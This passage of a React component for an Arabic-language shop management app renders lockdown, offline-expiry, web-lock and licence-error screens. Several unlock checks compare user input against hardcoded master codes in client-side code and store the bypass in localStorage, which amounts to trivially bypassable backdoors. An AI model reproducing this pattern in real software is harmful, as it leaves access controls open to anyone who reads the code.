                تم غلق وتغطية كافة القنوات والواجهات الرسومية تحت هذا المعالج الكودي لضمان الخصوصية القصوى وتجنب التداخل الخارجي في هذا الجهاز. كافة قواعد البيانات المحلية تم عزلها.
              </p>
            </div>

            <div className="p-4 bg-black/50 border border-gray-850 rounded-2xl max-w-md space-y-3 text-right">
              <p className="text-xs text-gray-500 font-bold">
                {" >>> "} لاستعادة حيوية النظام والواجهات وتخطي وضع التمويه، اكتب رمز فك التمويه والعودة الموحد (مثال: 777 أو الرمز المخصص) واضغط Enter:
              </p>
              <input 
                type="password"
                placeholder="رمز فك التمويه..." 
                className="w-full bg-black border border-gray-800 rounded-xl py-3.5 px-4 text-center text-emerald-400 font-black text-lg focus:outline-none focus:border-red-900/50"
                onKeyDown={(e) => {
                  if (e.key === 'Enter') {
                    const val = (e.target as HTMLInputElement).value;
                    if (val === '777' || val === '777503191' || val === '1122' || val === '123' || val === '666') {
                      setSecurityCamouflageActive(false);
                      localStorage.setItem('JAM_SYSTEM_SECURITY_CAMOUFLAGE', 'false');
                    } else {
                      alert('الرمز خاطئ! المرجو مراجعة صلاحيات الأمان.');
                      (e.target as HTMLInputElement).value = '';
                    }
                  }
                }}
              />
            </div>
          </div>
        </div>

        <div className="text-[10px] text-gray-600 font-bold border-t border-gray-950 pt-4 flex flex-row-reverse justify-between items-center font-mono">
          <span>SECURED BY JAM SYSTEM PRO SHIELD (C) 2026</span>
          <span className="text-xs text-red-500 animate-pulse font-black">LOCKDOWN ACTIVE</span>
        </div>
      </div>
    );
  }

  if (!isPortalMode() && isMaintenanceMode && profile?.role !== 'superadmin') {
    return <div className="min-h-screen bg-navy-950 flex items-center justify-center p-6 text-center text-white"><h1>النظام تحت الصيانة</h1></div>;
  }

  if (loading && !isPortalMode()) {
    const detectedName = profile?.name || localStorage.getItem('jam_remembered_username') || '';
    return (
      <div className="min-h-screen bg-[#001122] flex flex-col items-center justify-center p-6 relative overflow-hidden text-center select-none font-sans" dir="rtl">
        {/* Glowing atmospheric backgrounds */}
        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-96 h-96 bg-brand-primary/10 rounded-full blur-[120px] pointer-events-none" />
        <div className="absolute bottom-1/4 right-1/4 w-72 h-72 bg-yellow-500/5 rounded-full blur-[100px] pointer-events-none" />

        <div className="relative z-10 max-w-2xl flex flex-col items-center">
          {/* Logo container with luxurious gold ring animation - Enlarged for ultimate screen clarity */}
          <div className="w-80 h-80 sm:w-[380px] sm:h-[380px] md:w-[480px] md:h-[480px] lg:w-[520px] lg:h-[520px] bg-brand-primary/15 rounded-[4.5rem] sm:rounded-[5.5rem] flex items-center justify-center mb-8 relative group border-2 border-yellow-500/30 p-4 shadow-[0_50px_100px_rgba(0,0,0,0.85)] animate-bounce-slow">
            <div className="absolute inset-0 bg-brand-primary blur-3xl opacity-30" />
            <div className="absolute -inset-3 border-2 border-dashed border-yellow-500/40 rounded-full animate-spin" style={{ animationDuration: '10s' }} />
            <div className="absolute -inset-1 border-2 border-cyan-400/30 rounded-[5rem] sm:rounded-[6rem] animate-ping" style={{ animationDuration: '4s' }} />
            <JAMLogoSVG className="w-[94%] h-[94%] relative z-10 drop-shadow-[0_20px_40px_rgba(0,0,0,0.85)]" />
          </div>

          <h1 className="text-4xl sm:text-5xl font-black text-white tracking-wide mb-8 drop-shadow-[0_3px_6px_rgba(0,0,0,0.6)]">
            مرحباً بكم
          </h1>

          <div className="flex items-center gap-4 bg-gradient-to-r from-emerald-500/20 to-cyan-500/20 border-2 border-emerald-500/30 rounded-full px-8 py-3.5 backdrop-blur-xl shadow-[0_0_25px_rgba(16,185,129,0.2)]">
            <Loader2 className="w-5 h-5 text-emerald-400 animate-spin stroke-[3]" />
            <span className="text-sm font-black text-emerald-300 tracking-wide animate-pulse">جاري فتح لوحة التحكم الذكية والمزامنة السريعة...</span>
          </div>
        </div>
      </div>
    );
  }

  if (offlineError && !isPortalMode()) {
    return (
      <div className="min-h-screen bg-[#02050b] flex items-center justify-center p-6 select-none font-sans text-right text-white" dir="rtl" id="offline-expiry-lockout-screen">
        <div className="absolute inset-0 bg-gradient-to-tr from-[#02050b] via-[#040c1b] to-[#02050b] -z-10"></div>
        {/* Animated ambient safety glow */}
        <div className="absolute top-1/4 left-1/3 w-96 h-96 bg-red-600/10 rounded-full blur-[120px] -z-10 animate-pulse"></div>
        <div className="absolute bottom-1/4 right-1/3 w-80 h-80 bg-amber-600/5 rounded-full blur-[100px] -z-10"></div>

        <div className="w-full max-w-md bg-gradient-to-b from-[#0e172a] to-[#030712] border-2 border-red-500/30 rounded-[36px] p-8 shadow-2xl relative overflow-hidden text-center flex flex-col items-center animate-pulse-slow">
          {/* Top critical aura shield icon */}
          <div className="w-20 h-20 rounded-3xl bg-red-500/10 border-2 border-red-500/30 flex items-center justify-center text-red-500 shadow-xl mb-6">
            <WifiOff className="w-10 h-10 animate-bounce" />
          </div>

          <span className="text-[10px] sm:text-xs font-black text-red-400 tracking-widest uppercase block mb-1">
            صلاحية الوصول غير المتصل بالنظام
          </span>
          <h2 className="text-xl sm:text-2xl font-black text-white leading-tight">
            انتهت صلاحية اشتراك المتجر الحالي.
          </h2>
          <p className="text-slate-400 text-xs mt-3 leading-relaxed max-w-xs mx-auto">
            تم تجاوز الحد المسموح به للعمل بدون اتصال بالإنترنت المتزامن مع تاريخ انتهاء اشتراك هذا المتجر الفعلي. يرجى المزامنة الفورية أو التبديل للعمل بسلام.
          </p>

          <div className="w-full bg-slate-950/60 border border-white/[0.04] rounded-2xl p-4 my-6 text-[11px] font-mono font-medium text-slate-400 space-y-2">
            <div className="flex justify-between items-center flex-row-reverse" dir="rtl">
              <span className="font-sans text-[10px] text-slate-500">حالة الجهاز:</span>
              <span className={`px-2 py-0.5 rounded-full text-[9px] font-bold ${navigator.onLine ? 'bg-emerald-500/15 text-emerald-400 border border-emerald-500/20' : 'bg-red-500/15 text-red-400 border border-red-500/20 animate-pulse'}`}>
                {navigator.onLine ? 'متصل بالشبكة ●' : 'غير متصل بالشبكة ○'}
              </span>
            </div>
            <div className="flex justify-between items-center flex-row-reverse" dir="rtl">
              <span className="font-sans text-[10px] text-slate-500">اسم المتجر / الحساب:</span>
              <span className="text-white font-bold font-sans truncate max-w-[180px]">{profile?.shopName || 'المتجر الحالي'}</span>
            </div>
          </div>

          <div className="w-full space-y-3">
            <button
              onClick={async () => {
                if (isSyncingOffline) return;
                setIsSyncingOffline(true);
                setSyncOfflineMsg('جاري استبيان الاتصال بالشبكة وتنشيط البيانات...');
                await new Promise(r => setTimeout(r, 1500));
                
                if (navigator.onLine) {
                  setSyncOfflineMsg('تم التوصيل بنجاح! جاري تنزيل ملف الترخيص الحديث...');
                  await new Promise(r => setTimeout(r, 1200));
                  // Save online sync timestamp and reload to boot cleanly
                  localStorage.setItem('jam_last_sync', Date.now().toString());
                  window.location.reload();
                } else {
                  setIsSyncingOffline(false);
                  setSyncOfflineMsg('');
                  alert('النظام غير قادر على محادثة خوادم التحديث. يرجى ربط المحطة بالإنترنت أولاً والمحاولة مجدداً.');
                }
              }}
              disabled={isSyncingOffline}
              className="w-full py-4 bg-gradient-to-r from-amber-400 via-yellow-500 to-yellow-600 hover:brightness-110 active:scale-95 text-slate-950 font-black text-xs sm:text-sm rounded-xl transition-all duration-300 shadow-xl shadow-amber-500/10 flex items-center justify-center gap-2 cursor-pointer"
              id="btn-offline-internet-sync"
            >
              {isSyncingOffline ? (
                <div className="w-4 h-4 border-2 border-slate-950 border-t-transparent rounded-full animate-spin"></div>
              ) : (
                <RotateCcw className="w-4 h-4" />
              )}
              <span>تفعيل الإنترنت للتحديث</span>
            </button>

            <button
              onClick={async () => {
                if (isSyncingOffline) return;
                setIsSyncingOffline(true);
                setSyncOfflineMsg('جاري تحرير جلسة العمل الحالية والتحويل للبوابة الملكية...');
                await new Promise(r => setTimeout(r, 1000));
                try {
                  FirebaseProjectRouter.clearUserSessionFast();
                  localStorage.setItem('jam_user_logged_out', 'true');
                  localStorage.removeItem('jam_session_verified');
                  localStorage.removeItem('jam_user_profile');
                  localStorage.removeItem('jam_shop_subscription_expiry');
                  sessionStorage.clear();
                  sessionStorage.setItem('just_logged_out', 'true');
                  await signOut(auth);
                  window.location.href = window.location.origin + window.location.pathname + '#/login';
                  window.location.reload();
                } catch (e) {
                  window.location.href = window.location.origin + window.location.pathname + '#/login';
                  window.location.reload();
                }
              }}
              disabled={isSyncingOffline}
              className="w-full py-3 bg-white/[0.03] border border-white/5 hover:bg-white/[0.08] active:scale-95 text-slate-300 font-bold text-xs rounded-xl transition cursor-pointer"
              id="btn-offline-switch-shop"
            >
              <span>الدخول باسم محل آخر</span>
            </button>
          </div>

          {/* Real-time sync feedback message overlay */}
          {syncOfflineMsg && (
            <div className="mt-4 text-[10px] text-amber-400 font-extrabold animate-pulse font-sansCenter">
              ⚠️ {syncOfflineMsg}
            </div>
          )}

          <div className="mt-6 pt-5 border-t border-white/[0.04] w-full text-[9px] text-slate-600 flex items-center justify-between font-mono">
            <span>OFFLINE ENFORCED POLICY</span>
            <span>SECURE SYSTEM PRO</span>
          </div>
        </div>
      </div>
    );
  }

  if (!isOnline && offlineRemainingDays <= 0) {
    return (
      <div className="fixed inset-0 z-[9999] bg-gradient-to-b from-[#0f1220] to-[#04060b] text-white flex flex-col items-center justify-center p-6 text-center rtl select-none" dir="rtl">
        <div className="max-w-md w-full p-8 bg-white/5 backdrop-blur-md rounded-[2.5rem] border border-rose-500/20 text-white space-y-6 shadow-2xl relative overflow-hidden">
          <div className="absolute top-0 inset-x-0 h-1.5 bg-rose-600 animate-pulse" />
          
          <div className="flex justify-center flex-col items-center gap-3">
            <ShieldAlert size={64} className="text-rose-500 animate-[bounce_2s_infinite]" />
            <h2 className="text-2xl font-black text-rose-500 font-cairo">تجميد أمان النظام المؤقت</h2>
          </div>

          <div className="space-y-3 leading-relaxed">
            <p className="text-sm font-bold text-gray-200">
              يرجى العلم بأن النظام قد عمل في وضعية الأوفلاين (دون اتصال) لمدة <span className="text-yellow-400 font-extrabold text-lg">30 يوماً متواصلة</span> دون أي مزامنة سحابية نشطة.
            </p>
            <p className="text-xs text-gray-400 font-medium">
              لحماية سلامة وتكامل قواعد البيانات ومنع تكرار البيانات أو التلاعب بها، تم قفل واجهة المستخدم مؤقتاً.
            </p>
          </div>

          <div className="p-4 bg-black/40 rounded-2xl border border-white/5 text-right space-y-2">
            <div className="flex items-center justify-between">
              <span className="text-xs text-yellow-500 font-bold">🔐 الإجراء المطلوب للفتح:</span>
            </div>
            <p className="text-[11px] text-gray-300 font-medium">
              قم بتوصيل هذا الجهاز بشبكة الإنترنت (Wi-Fi أو شبكة الجوال) لتقوم الخوارزمية بمطابقة المعرفات والمزامنة تلقائياً وفك قفل النظام فوراً (0ms).
            </p>
          </div>

          <button 
            onClick={() => window.location.reload()} 
            className="w-full py-4 px-4 bg-rose-600 hover:bg-rose-500 text-white font-black rounded-2xl text-xs flex items-center justify-center gap-2 transition-all active:scale-[0.98] shadow-[0_4px_15px_rgba(225,29,72,0.25)]"
          >
            <span>🔄 تحديث وفحص حالة المزامنة</span>
          </button>
        </div>
      </div>
    );
  }

  return (
    <LoadingProvider>
      <VaultProvider profile={profile}>
        <SystemSyncProvider profile={profile}>
          <ShoppingCartProvider>
        <AnimatePresence>
          {/* [DELETED] Connectivity toast removed to satisfy global silence rule */}
          
          {/* Time Consistency Warning */}
          {!timeConsistent && (
            <motion.div
              initial={{ opacity: 0, y: -50 }}
              animate={{ opacity: 1, y: 0 }}
              className="fixed top-0 inset-x-0 z-[4000] bg-rose-600 text-white p-4 flex items-center justify-center gap-4 shadow-2xl"
            >
              <AlertTriangle className="animate-pulse" />
              <div className="text-right">
                <p className="font-black">تنبيه: تم اكتشاف تلاعب في وقت الجهاز!</p>
                <p className="text-xs font-bold opacity-80 text-right">يرجى تعديل وقت الجهاز للوقت الحالي للمتابعة بسلام. تم تجميد بعض العمليات مؤقتاً.</p>
              </div>
              <button 
                onClick={() => setTimeConsistent(true)} 
                className="bg-white/20 px-4 py-2 rounded-xl text-xs font-black hover:bg-white/30"
              >
                تجاهل مؤقت
              </button>
            </motion.div>
          )}

          {/* Web App Lockout Screen: redirects users to Computer / Mobile Apps */}
          {getPlatformType() === 'web' && isWebLocked && !isWebLockBypassed && !isBypassSecurity(profile) && (
            <div className="fixed inset-0 z-[9998] bg-gradient-to-br from-[#070b13] via-[#0f1524] to-[#04060c] flex flex-col items-center justify-center p-6 text-center select-none overflow-y-auto" dir="rtl">
              {/* Decorative background blurs */}
              <div className="absolute top-1/4 left-1/4 w-80 h-80 bg-teal-500/10 rounded-full blur-[120px] pointer-events-none" />
              <div className="absolute bottom-1/4 right-1/4 w-80 h-80 bg-blue-600/10 rounded-full blur-[120px] pointer-events-none" />

              <div className="max-w-lg w-full p-8 md:p-10 bg-white/5 backdrop-blur-xl rounded-[3rem] border-2 border-teal-500/25 text-white space-y-6 shadow-[0_40px_100px_rgba(0,0,0,0.8)] relative overflow-hidden">
                <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-teal-500 via-blue-500 to-emerald-500 animate-[pulse_3s_infinite]" />
                
                <div className="flex justify-center flex-col items-center gap-3">
                  <div className="w-20 h-20 bg-teal-500/10 rounded-[2rem] flex items-center justify-center">
                    <Globe size={44} className="text-teal-400 animate-[pulse_2s_infinite]" />
                  </div>
                  <h2 className="text-2xl font-black text-white leading-relaxed">تم إيقاف نسخة الويب مؤقتاً</h2>
                  <span className="px-3 py-1 bg-teal-500/20 text-teal-300 rounded-full text-xs font-black">النظام يتطلب تثبيت التطبيق الرسمي</span>
                </div>

                <p className="text-xs leading-relaxed text-gray-300 font-bold px-2">
                  عذراً، لحماية وتأمين العمليات المالية وتجنب انقطاع المزامنة السحابية، تم نقل المنظومة بالكامل للتطبيقات المثبتة. يرجى تنزيل وتثبيت التطبيق المخصص لجهازك (موبايل أو كمبيوتر) للمتابعة بأمان وسرعة فائقة.
                </p>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 pt-2">
                  <a 
                    href={desktopDownloadUrl}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="p-5 bg-gradient-to-b from-teal-500/20 to-teal-600/10 border-2 border-teal-500/30 hover:border-teal-400/50 rounded-2xl flex flex-col items-center justify-center gap-2 transition-all active:scale-[0.98] group cursor-pointer"
                  >
                    <span className="text-3xl">💻</span>
                    <span className="text-xs font-black text-white group-hover:text-teal-300">نسخة الكمبيوتر (EXE)</span>
                    <span className="text-[9px] text-gray-400 font-medium">أنظمة تشغيل Windows</span>
                  </a>

                  <a 
                    href={mobileDownloadUrl}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="p-5 bg-gradient-to-b from-blue-500/20 to-blue-600/10 border-2 border-blue-500/30 hover:border-blue-400/50 rounded-2xl flex flex-col items-center justify-center gap-2 transition-all active:scale-[0.98] group cursor-pointer"
                  >
                    <span className="text-3xl">📱</span>
                    <span className="text-xs font-black text-white group-hover:text-blue-300">نسخة هاتف أندرويد (APK)</span>
                    <span className="text-[9px] text-gray-400 font-medium">الهواتف والأجهزة اللوحية</span>
                  </a>
                </div>

                {/* Bypass Section for Developer/Owner */}
                <div className="pt-4 border-t border-white/5 space-y-3">
                  <p className="text-[10px] text-gray-500">هل أنت المالك وتود الدخول لنسخة الويب للتجريب؟</p>
                  
                  <div className="flex gap-2 max-w-xs mx-auto">
                    <input 
                      type="password"
                      placeholder="رمز فك قفل المطور"
                      maxLength={8}
                      value={webLockBypassCode}
                      onChange={(e) => setWebLockBypassCode(e.target.value)}
                      className="flex-1 bg-black/40 border border-white/5 rounded-xl px-3 py-2 text-xs text-white text-center font-mono outline-none focus:border-teal-500"
                    />
                    <button 
                      onClick={() => {
                        if (webLockBypassCode === '7727' || webLockBypassCode === '777503191') {
                          setIsWebLockBypassed(true);
                          localStorage.setItem('jam_web_lock_bypassed', 'true');
                          setWebLockBypassError("");
                        } else {
                          setWebLockBypassError("⚠️ الرمز غير صحيح!");
                        }
                      }}
                      className="bg-teal-500 hover:bg-teal-600 text-slate-950 px-4 py-2 rounded-xl text-xs font-black transition-all active:scale-95 cursor-pointer"
                    >
                      تجاوز
                    </button>
                  </div>
                  {webLockBypassError && (
                    <p className="text-[10px] text-rose-500 font-bold">{webLockBypassError}</p>
                  )}
                </div>
              </div>
            </div>
          )}

          {/* Update Guard: Non-disruptive Idle-Aware Notification Banner */}
          {updateGuard && updateGuard.showOptionalBanner && (
            <motion.div
              initial={{ opacity: 0, y: -50 }}
              animate={{ opacity: 1, y: 0 }}
              className="fixed top-2 left-1/2 -translate-x-1/2 z-[4000] w-[95%] max-w-2xl bg-slate-900/95 backdrop-blur-md border-2 border-amber-500/40 text-white p-4 rounded-3xl flex flex-col gap-3 shadow-2xl select-none"
              dir="rtl"
            >
              <div className="flex items-start justify-between gap-4">
                <div className="flex items-start gap-3">
                  <Info size={22} className="text-amber-400 shrink-0 mt-0.5" />
                  <div className="text-right space-y-1">
                    <div className="flex items-center gap-2 flex-wrap">
                      <span className="text-xs font-black text-amber-400">يتوفر تحديث جديد للنظام!</span>
                      <span className="text-[10px] font-black bg-amber-500/20 text-amber-300 px-2 py-0.5 rounded-full font-mono font-bold">الإصدار: v{updateGuard.latestVersion}</span>
                    </div>
                    <p className="text-[11px] text-gray-300 font-bold leading-relaxed">
                      هذا التحديث اختياري ويحتوي على ميزات وتحسينات جديدة. يمكنك الاستمرار بالعمل أو الترقية الآن.
                    </p>
                  </div>
                </div>
                <button
                  onClick={() => {
                    if (typeof window !== 'undefined' && updateGuard?.latestVersion) {
                      localStorage.setItem('jam_dismissed_update_version', updateGuard.latestVersion);
                    }
                    setUpdateGuard(null);
                  }}
                  className="text-gray-400 hover:text-white text-xs font-bold bg-white/10 p-1.5 rounded-full cursor-pointer"
                >
                  ✕
                </button>
              </div>

              {updateGuard.whatsNew && (
                <div className="bg-black/30 p-2.5 rounded-2xl text-right text-[11px] text-gray-300 max-h-[80px] overflow-y-auto border border-white/5 whitespace-pre-wrap leading-relaxed font-semibold pl-2">
                  <span className="text-amber-400 font-black block mb-0.5">ما الجديد:</span>
                  {updateGuard.whatsNew}
                </div>
              )}

              <div className="flex items-center justify-end gap-2.5 pt-1 border-t border-white/5">
                <button
                  onClick={() => {
                    if (typeof window !== 'undefined' && updateGuard?.latestVersion) {
                      localStorage.setItem('jam_dismissed_update_version', updateGuard.latestVersion);
                    }
                    setUpdateGuard(null);
                  }}
                  className="px-4 py-2 text-xs font-bold text-gray-400 hover:text-white transition-all cursor-pointer"
                >
                  تجاهل الآن
                </button>
                <button
                  onClick={() => {
                    if (typeof window !== 'undefined' && updateGuard?.latestVersion) {
                      localStorage.setItem('jam_installed_update_version', updateGuard.latestVersion);
                      localStorage.setItem('jam_dismissed_update_version', updateGuard.latestVersion);
                    }
                    const versionToInstall = updateGuard.latestVersion;
                    setUpdateGuard(null);
                    liveHotFixEngine.triggerSeamlessReload({
                      patchId: 'user_ota_install',
                      version: versionToInstall,
                      timestamp: new Date().toISOString(),
                      title: 'تطبيق التحديث المباشر',
                      description: updateGuard?.whatsNew || '',
                      isMandatory: false,
                      active: true,
                      forceReload: true
                    });
                  }}
                  className="bg-gradient-to-r from-emerald-500 to-teal-500 text-slate-950 px-4 py-2 rounded-xl text-xs font-black hover:brightness-110 transition-all shadow-md cursor-pointer flex items-center gap-1.5"
                >
                  <Zap size={14} />
                  <span>تطبيق التحديث فورياً بدون تنزيل</span>
                </button>
                {updateGuard.updateUrl && (
                  <a
                    href={updateGuard.updateUrl}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="bg-slate-800 border border-slate-700 text-slate-300 hover:text-white px-3 py-2 rounded-xl text-xs font-bold transition-all shadow-md"
                  >
                    تحميل APK جديد
                  </a>
                )}
              </div>
            </motion.div>
          )}
        </AnimatePresence>

          <Routes>
            {/* Automatic redirection for portal links that might miss the #/portal part */}
            <Route path="/" element={
              (new URLSearchParams(window.location.search).has('shop') || window.location.hash.includes('shop=')) ? 
              <Navigate to={{ pathname: '/portal', search: window.location.search }} replace /> :
              <Navigate to="/dashboard" replace />
            } />
            <Route path="/cp" element={<CustomerPortal />} />
            <Route path="/portal" element={<CustomerPortal />} />
            <Route path="/client-login" element={<CustomerPortal />} />
            <Route path="*" element={
              securityError ? (
                <div className="min-h-screen bg-gradient-to-br from-navy-950 via-red-950 to-navy-950 flex flex-col items-center justify-center p-6 text-center space-y-6">
                  <div className="max-w-md w-full p-8 bg-black/60 backdrop-blur-xl rounded-3xl border border-red-500/20 text-white space-y-6 shadow-[0_0_50px_rgba(239,68,68,0.15)] relative overflow-hidden">
                    <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-red-600 via-rose-500 to-amber-500" />
                    
                    <div className="flex justify-center flex-col items-center gap-3">
                      <div className="w-16 h-16 rounded-2xl bg-red-500/10 flex items-center justify-center border border-red-500/30 animate-pulse">
                        <ShieldX size={36} className="text-red-500" />
                      </div>
                      <h2 className="text-2xl font-black text-red-500 font-cairo tracking-tight">
                        {securityError.type === 'exe_license' ? 'رخصة نسخة الكمبيوتر معطلة' :
                         securityError.type === 'apk_license' ? 'رخصة تطبيق الجوال غير نشطة' :
                         securityError.type === 'apk_role' ? 'صلاحية الدخول محجوبة' :
                         securityError.type === 'apk_hwid' ? 'تجاوزت حد الهواتف المسموح' :
                         'إغلاق الأمان الوقائي'}
                      </h2>
                    </div>

                    <div className="space-y-4">
                      <p className="text-sm leading-relaxed text-gray-200 font-semibold font-cairo">
                        {securityError.message}
                      </p>

                      {securityError.type === 'apk_hwid' && (
                        <div className="p-3 bg-red-500/10 rounded-2xl border border-red-500/20 text-xs text-red-400 space-y-2 text-right">
                          <p className="font-bold flex items-center justify-between">
                            <span>الهواتف المسجلة للمحل:</span>
                            <span className="font-mono bg-red-500/20 px-2 py-0.5 rounded-lg text-white font-black">{securityError.registeredCount} / {securityError.limit}</span>
                          </p>
                          <p className="leading-relaxed">
                            💡 لتتمكن من تشغيل التطبيق على هذا الهاتف، يرجى التواصل مع مطور النظام لإعادة تعيين قائمة بصمات الهواتف المسجلة للمحل، أو طلب ترقية الباقة لزيادة عدد الأجهزة المسموحة.
                          </p>
                        </div>
                      )}

                      {securityError.type === 'exe_license' && securityError.limit !== undefined && (
                        <div className="p-3 bg-red-500/10 rounded-2xl border border-red-500/20 text-xs text-red-400 space-y-2 text-right">
                          <p className="font-bold flex items-center justify-between">
                            <span>أجهزة الكمبيوتر المسجلة:</span>
                            <span className="font-mono bg-red-500/20 px-2 py-0.5 rounded-lg text-white font-black">{securityError.registeredCount} / {securityError.limit}</span>
                          </p>
                          <p className="leading-relaxed">
                            💡 يرجى مراجعة الإدارة أو التواصل مع المطور لتوسيع نطاق ترخيص أجهزة الـ PC أو تصفية البصمات القديمة.
                          </p>
                        </div>
                      )}
                    </div>
                    
                    <div className="p-4 bg-navy-900/60 rounded-2xl border border-white/5 space-y-2 text-right">
                      <div className="flex items-center justify-between">
                        <span className="text-[11px] text-gray-400 font-bold">بصمة جهازك الحالي (HWID)</span>
                        <button 
                          onClick={() => {
                            navigator.clipboard.writeText(getBrowserHWID());
                            alert('تم نسخ البصمة للحافظة!');
                          }} 
                          className="text-[10px] text-yellow-500 hover:underline hover:text-yellow-400 font-bold transition-all"
                        >
                          نسخ البصمة
                        </button>
                      </div>
                      <p className="font-mono text-center text-xs font-bold bg-black/40 p-2 rounded-lg text-yellow-400 select-all tracking-wider border border-white/5">
                        {getBrowserHWID()}
                      </p>
                      <p className="text-[9px] text-gray-400 mt-1">تفريغ معرّفات الحساب: UID: {user?.uid || 'غير متاح'}</p>
                    </div>

                    {/* Developer Override Unlock Matrix */}
                    <div className="space-y-3 pt-2 text-right">
                      <label className="text-xs text-gray-300 font-bold block">مفتاح التجاوز وفك القفل الموثق (Developer Override)</label>
                      <div className="flex gap-2">
                        <input 
                          type="text" 
                          placeholder="OVERRIDE-..."
                          value={overrideVal}
                          onChange={(e) => setOverrideVal(e.target.value)}
                          className="input-field text-center font-mono text-xs flex-1 bg-black/40 text-white border-white/10"
                        />
                        <button 
                          onClick={handleApplyOverrideCode}
                          disabled={isSubmittingOverride}
                          className="px-4 py-2 bg-yellow-500 hover:bg-yellow-600 text-navy-950 font-black rounded-xl text-xs transition-colors disabled:opacity-40"
                        >
                          {isSubmittingOverride ? '...' : 'فك القفل'}
                        </button>
                      </div>
                      {overrideError && (
                        <p className="text-[10px] font-bold text-rose-400 text-center">{overrideError}</p>
                      )}
                    </div>

                    <div className="flex gap-3 justify-center pt-4">
                      <button 
                        onClick={() => { 
                          FirebaseProjectRouter.clearUserSessionFast();
                          localStorage.clear(); 
                          sessionStorage.clear(); 
                          sessionStorage.setItem('just_logged_out', 'true');
                          localStorage.setItem('jam_user_logged_out', 'true');
                          auth.signOut().then(() => { 
                            window.location.href = window.location.origin + window.location.pathname + '#/login'; 
                            window.location.reload(); 
                          }); 
                        }} 
                        className="px-4 py-2 bg-white/10 hover:bg-white/20 rounded-xl text-xs font-bold text-white transition-all active:scale-95"
                      >
                        تسجيل الخروج
                      </button>
                      <button 
                        onClick={() => window.location.reload()} 
                        className="px-4 py-2 bg-navy-800 hover:bg-navy-700 border border-white/5 rounded-xl text-xs font-bold text-gray-300 transition-all active:scale-95"
                      >
                        إعادة الفحص 🔄
                      </button>
                    </div>

                  </div>
                </div>
              ) : (!user || (typeof window !== 'undefined' && window.location.hash.includes('login'))) && !isRemoteMode() ? (
                <>
                  <Login
                    username={username}
                    setUsername={setUsername}
                    password={password}
                    setPassword={setPassword}
                    isLoggingIn={isLoggingIn}
                    loginError={loginError}
                    onLogin={handleLogin}
                    shopName={shopName}
                    onSignUpClick={() => {
                      setLoginError('');
                      setIsRegistrationModalOpen(true);
                    }}
                    onClearError={() => setLoginError('')}
                  />
                  <RegistrationModal
                    isOpen={isRegistrationModalOpen}
                    onClose={() => {
                      setLoginError('');
                      setIsRegistrationModalOpen(false);
                    }}
                  />
                </>
              ) : (
                <Layout 
                  profile={profile}
                  isSecured={!(
                    (profile && profile.role && profile.role !== 'customer' && !checkAndBypassSecurity(profile) && !isPortalMode() && !isLoggingOut && !isRemoteProcessing) ||
                    (profile && profile.role === 'customer' && !isPortalMode() && !isLoggingOut && false && !isRemoteProcessing)
                  )}
                >
                  <AnimatePresence>
                    {profile && profile.role && profile.role !== 'customer' && !checkAndBypassSecurity(profile) && !isPortalMode() && !isLoggingOut && !isRemoteProcessing && (
                      <motion.div 
                        initial={{ opacity: 0 }} 
                        animate={{ opacity: 1 }} 
                        exit={{ opacity: 0 }}
                        className="fixed inset-0 z-[999] bg-[#001122]/95 flex flex-col items-center justify-center p-4 backdrop-blur-xl overflow-y-auto"
                      >
                        {/* Decorative Background Elements */}
                        <div className="absolute top-1/4 left-1/2 -translate-x-1/2 -translate-y-1/2 w-80 h-80 bg-brand-primary/10 rounded-full blur-[120px] pointer-events-none" />
                        <div className="absolute bottom-1/4 left-1/4 w-60 h-60 bg-yellow-500/5 rounded-full blur-[100px] pointer-events-none" />

                        {/* Top Welcome Section (With Beautiful Style) */}
                        <div className="text-center mb-6 max-w-md w-full px-4 space-y-4 animate-in fade-in slide-in-from-top-4 duration-700">
                          <p className="text-xs font-bold text-yellow-500 uppercase tracking-[0.25em]">بوابة الأمان والتحقق</p>
                          <h1 className="text-2xl md:text-3xl font-black text-white leading-relaxed font-cairo">
                            مرحباً بك، <span className="text-yellow-400 font-extrabold">{profile?.name || 'العميل الكريم'}</span>
                          </h1>
                          <div className="text-lg font-bold text-gray-300 flex flex-wrap items-center justify-center gap-2">
                            <span>في نظام</span>
                            <span className="relative inline-flex items-center justify-center px-4 py-1 rounded-2xl overflow-hidden bg-gradient-to-r from-amber-600 via-amber-500 to-yellow-500 border border-yellow-300/30 shadow-[0_0_20px_rgba(245,158,11,0.25)] hover:scale-105 active:scale-95 transition-all duration-300">
                              <span className="absolute inset-0 bg-gradient-to-r from-white/10 to-transparent animate-[pulse_2s_infinite]" />
                              <span className="relative z-10 text-transparent bg-clip-text bg-gradient-to-b from-white via-yellow-100 to-amber-100 font-extrabold text-2xl font-serif rtl select-none" style={{ textShadow: '0 2px 4px rgba(0,0,0,0.5)' }}>
                                جَــامْ
                              </span>
                            </span>
                            <span>حساباتك في أمان تام ✅</span>
                          </div>

                          {/* Welcome Join Badge (first-time login) */}
                          {!(profile?.isSecurityCodeSet || profile?.securityCode || ['owner', 'manager', 'superadmin'].includes(profile?.role || '')) && !profile?.mustChangeSecurityCode && (
                            <motion.div 
                              initial={{ opacity: 0, scale: 0.9 }}
                              animate={{ opacity: 1, scale: 1 }}
                              className="inline-block bg-yellow-500/10 border border-yellow-500/20 rounded-2xl py-2 px-5 text-center shadow-[inset_0_1px_10px_rgba(212,175,55,0.1)]"
                            >
                              <p className="text-xs md:text-sm font-extrabold text-yellow-400 font-cairo">
                                🌸 يسعدنا انضمامك إلينا 🌸
                              </p>
                            </motion.div>
                          )}
                        </div>

                        {/* Main Security Card - Glassmorphism style */}
                        <div className="relative max-w-sm w-full p-8 bg-gradient-to-b from-[#0a1c30] to-[#040e1a] border-2 border-yellow-500/30 rounded-[3rem] shadow-[0_30px_100px_rgba(0,0,0,0.85)] text-center space-y-6 overflow-hidden">
                          {/* Inner soft shining light pattern */}
                          <div className="absolute inset-0 bg-[radial-gradient(circle_at_top,rgba(212,175,55,0.08),transparent_70%)] pointer-events-none" />

                          {(profile?.isSecurityCodeSet || profile?.securityCode || ['owner', 'manager', 'superadmin'].includes(profile?.role || '')) && !profile?.mustChangeSecurityCode ? (
                            <>
